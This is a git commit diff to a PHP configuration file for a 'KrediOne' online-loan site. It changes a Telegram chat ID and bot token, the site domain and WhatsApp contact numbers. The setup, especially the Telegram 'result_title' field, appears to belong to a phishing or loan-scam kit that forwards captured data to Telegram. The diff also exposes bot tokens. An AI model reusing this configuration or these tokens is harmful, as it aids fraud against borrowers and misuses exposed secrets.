ecf15d91915808111c138c9a6bb3cb84bc17f865
Asia <lapaktabel@gmail.com>
2025-07-16 22:16:44 +0700

    Update appConfig.php

--- appConfig.php
+++ appConfig.php
@@ -2,24 +2,24 @@
 return [
     // Konfigurasi Telegram
     'telegram' => [
-        'telegram_id'  => '6986082170',
-        'telegram_bot' => '7414641126:AAFD2JMNneru7YPllUD7XzFnH03tHk5PqD8',
+        'telegram_id'  => '5906925079',
+        'telegram_bot' => '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo',
         'result_title' => 'KrediOne',
     ],
 
     // Konfigurasi Website
     'web' => [
-        'domain'      => 'https://update360kredi.info',
+        'domain'      => 'https://360kredi.vercel.app',
         'app_name'    => 'KrediOne',
         'title'       => 'Kredione',
-        'description' => 'Kredione menyediakan pinjaman online cepat, bunga rendah, dan proses mudah untuk kebutuhan keuangan Anda. Wa☎️: 0821-6925-1415.',
+        'description' => 'Kredione menyediakan pinjaman online cepat, bunga rendah, dan proses mudah untuk kebutuhan keuangan Anda. Wa☎️: 0821-8990-9963.',
         'keywords'    => 'kredione, cs kredione, kredione, pinjaman online terpercaya, solusi keuangan, pinjamduit cepat, pinjol, download kredione, apk kredione',
         'icon'        => '/assets/logo.jpg',
         'image'       => '/assets/ponselduit.jpg',
 
         // Kontak
         'contact'     => [
-            'whatsapp'  => '6282169251415&text=Hallo%20KrediOne',
+            'whatsapp'  => 'https://wa.me/6282189909963&text=Hallo%20KrediOne',
             'telephone' => '',
             'email'     => '',
         ],
